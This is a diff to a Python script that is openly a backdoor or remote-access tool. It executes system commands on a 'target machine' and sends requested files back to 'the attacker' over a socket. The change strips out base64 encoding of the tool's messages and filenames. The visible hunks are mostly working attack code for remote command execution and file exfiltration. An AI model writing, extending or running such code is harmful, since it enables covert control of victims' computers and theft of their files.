@@ -2,7 +2,7 @@
 import socket
 import subprocess
 import os
-import base64 # For encode and decode message to notify the attacker
+
 #Test Push
 # Function to execute system commands on the target machine
 def execute_system_command(command):
@@ -11,13 +11,10 @@ def execute_system_command(command):
     except subprocess.CalledProcessError as e:
         return f"Error: {e}".encode()
 
-def base64_encode(encode_message):
-    encoded_message = base64.b64encode(encode_message.encode('utf-8'))
-    return encoded_message
 
 # Function to handle file download (sending file to the attacker)
 def send_file(conn):
-    filename = base64.b64encode(conn.recv(1024).decode('utf-8'))
+    filename = conn.recv(1024).decode('utf-8')
     print(f"The Filename is: {filename}")
     if os.path.exists(filename):
 
@@ -27,7 +24,6 @@ def send_file(conn):
             chunk = file.read(1024)
 
             while chunk:
-                conn.send(base64.b64encode("Downloading".encode('utf-8')))
                 conn.send(chunk)
                 chunk = file.read(1024)
             #conn.sendall(b"END_FILE_TRANSFER")  # Notify the attacker that file transfer is complete
@@ -38,7 +34,7 @@ def send_file(conn):
         handle_commands(conn)
     else:
         print('File not Found!')
-        conn.send(base64.b64encode("File not found".encode('utf-8')))
+        conn.send("File not found".encode('utf-8'))
         handle_commands(conn)
 
     # After download is complete, call the `handle_commands` function again
